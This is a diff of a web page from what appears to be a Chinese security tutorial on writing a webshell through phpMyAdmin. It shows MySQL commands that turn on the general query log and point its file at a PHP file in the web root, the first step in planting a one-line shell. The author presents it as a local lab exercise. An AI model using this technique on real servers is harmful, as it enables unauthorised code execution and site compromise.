@@ -406,11 +406,11 @@
 <p>这时候我们需要换个思路</p>
 <h3 id="利用mysql-错误日志写入一句话"><a href="#利用mysql-错误日志写入一句话" class="headerlink" title="利用mysql 错误日志写入一句话"></a>利用mysql 错误日志写入一句话</h3><p>这里需要先设置 general log (日志保存状态)general log file(日志保存路径)</p>
 <p>先执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;general%&apos; a</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'general%'</span> a</span><br></pre></td></tr></table></figure>
 <p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/2.png" alt=""></p>
 <p>我们需要把general log 改为ON 也就是打开状态</p>
 <p>还要把general log file路径改为网站的根目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;; </span><br><span class="line"></span><br><span class="line">set global general_log_file=&apos;D:/stduy/PHPTutorial/WWW/infos.php&apos;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> global general_log = <span class="string">"ON"</span>; </span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> global <span class="attribute">general_log_file</span>=<span class="string">'D:/stduy/PHPTutorial/WWW/infos.php'</span>;</span><br></pre></td></tr></table></figure>
 <p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/3.png" alt=""></p>
 <p>执行完后因为我是本地搭建环境所以可以看到成功创建了</p>
 <p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/4.png" alt=""></p>
